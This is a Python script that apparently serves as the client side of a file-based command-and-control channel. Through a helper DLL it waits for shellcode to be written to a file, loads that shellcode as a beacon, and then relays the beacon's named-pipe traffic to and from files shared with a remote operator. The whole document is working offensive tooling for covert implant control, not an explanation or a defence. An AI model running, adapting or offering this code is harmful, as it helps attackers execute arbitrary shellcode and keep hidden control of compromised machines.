#!/usr/bin/python
from ctypes import *
from ctypes.wintypes import *
from time import sleep
import sys
import os

maxlen = 1024*1024

lib = CDLL('c2file.dll')
#lib = WinDLL('c2file.dll')

lib.start_beacon.argtypes = [c_char_p,c_int]
lib.start_beacon.restype = POINTER(HANDLE)
def start_beacon(payload):
  return(lib.start_beacon(payload,len(payload)))  

lib.read_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.read_frame.restype = c_int
def ReadPipe(hPipe):
  mem = create_string_buffer(maxlen)
  l = lib.read_frame(hPipe,mem,maxlen)
  if l < 0: return(-1)
  chunk=mem.raw[:l]
  return(chunk)  

lib.write_frame.argtypes = [POINTER(HANDLE),c_char_p,c_int]
lib.write_frame.restype = c_int
def WritePipe(hPipe,chunk):
  sys.stdout.write('wp: %s\n'%len(chunk))
  sys.stdout.flush()
  print chunk
  ret = lib.write_frame(hPipe,c_char_p(chunk),c_int(len(chunk)))
  sleep(3) 
  print "ret=%s"%ret
  return(ret)

#pythonized
def put_file(ffile,data):
  f = open(ffile,'wb')
  f.write(data)
  f.close()

#pythonized
def get_file(fin):
  f = open(fin,'rb')
  chunk = f.read()
  f.close()
  return(chunk)

#/* the main logic for our client */
def go(name):
  fout = "%s.bea"% name
  fin = "%s.beb"% name
  
  put_file(fout,"go")
  put_file(fin,"")
  p=""
  print "wait for shellcode"
  while( len(p) <= 0):
    sleep(0.3)
    p = get_file(fin)
  print "got code, loading"
  sleep(2)
  put_file(fin,"")
  handle_beacon = start_beacon(p)
  print "loaded, got handle %s"%handle_beacon
  
  
  while(True):
    #sys.stdout.write('.')
    #sys.stdout.flush()
    sleep(1.5) 
    chunk = ReadPipe(handle_beacon)
    if chunk < 0:
      print 'readpipe %d'%len(chunk)
      break
    else:
      print("we've got %d bytes from pipe"%len(chunk))
    if len(chunk) > 1: 
      print("send to server in %s"%fout)
      put_file(fout,chunk)
    fsize = os.stat(fin).st_size
    fchunk=" "
    if( fsize > 0):
      print("%d bytes incoming"%fsize)
      fchunk = get_file(fin)
      put_file(fin,"")
    print("writing %s bytes to pipe"%len(fchunk))
    r = WritePipe(handle_beacon, fchunk)
    print("wrote %s bytes to pipe"%r)

if __name__ == '__main__':
  if len(sys.argv) > 1:
    name = sys.argv[1]
  else: 
    print("%s [name]"% sys.argv[0])
    quit()
  go(name)
